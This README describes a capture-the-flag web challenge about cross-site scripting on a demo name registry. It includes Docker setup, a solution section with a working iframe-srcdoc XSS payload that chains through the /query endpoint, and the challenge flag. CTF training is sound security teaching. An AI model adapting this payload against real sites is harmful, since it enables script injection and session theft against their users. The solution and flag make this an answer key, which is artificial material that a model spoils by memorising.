# README

A white-hat hacker notified your SecTech that her public name registry is vulnerable to Cross-Site-Scripting (XSS)! He kindly reported the `/query` endpoint is vulnerable to XSS! It is up to you to validate what the hacker said! Try to exploit the following endpoint to identify anymore XSS vulnerability!

`http://sec-tech.cf:8080?q=max`

If you managed to get a pop-out box, send the payload to the GovTech admin in discord! Let him validate your XSS prowess and exchange for a flag! From time to time, if you are willing, put an interesting message in the XSS payload and he will use your payload during "air" time for this challenge! Or you figure out any interesting payload that does something funny, e.g. redirect the page away, or change the images! Show it to him! Who knows! He is easily impressed anyway! You might just get a flag!

_In actual applications you see in the wild, it is common for a single web application to suffer vulnerabilities on multiple endpoints! For this case, it was reported that `http://sec-tech.cf:8080/query` is vulnerable to XSS. Now you have to figure out if the main page `http://sec-tech.cf:8080` has XSS-related vulnerabillities!_

_Figuring it out the XSS vulnerability on the `/query` endpoint won't give you the flag, but it will be something that helps!_

## Setup

``` bash
#./demo-challenge-web
sudo docker-compose up --build
```

## Solution

Submission: http://sec-tech.cf:8081

``` bash
# http://sec-tech.cf:8080/?q=<iframe srcdoc="<script src='http://sec-tech.cf:8080/query?name=alert(`pwn-ed`);//'></script>"></iframe>
```

Flag: `WH2020{th3_XsS_pr0w3$$}`
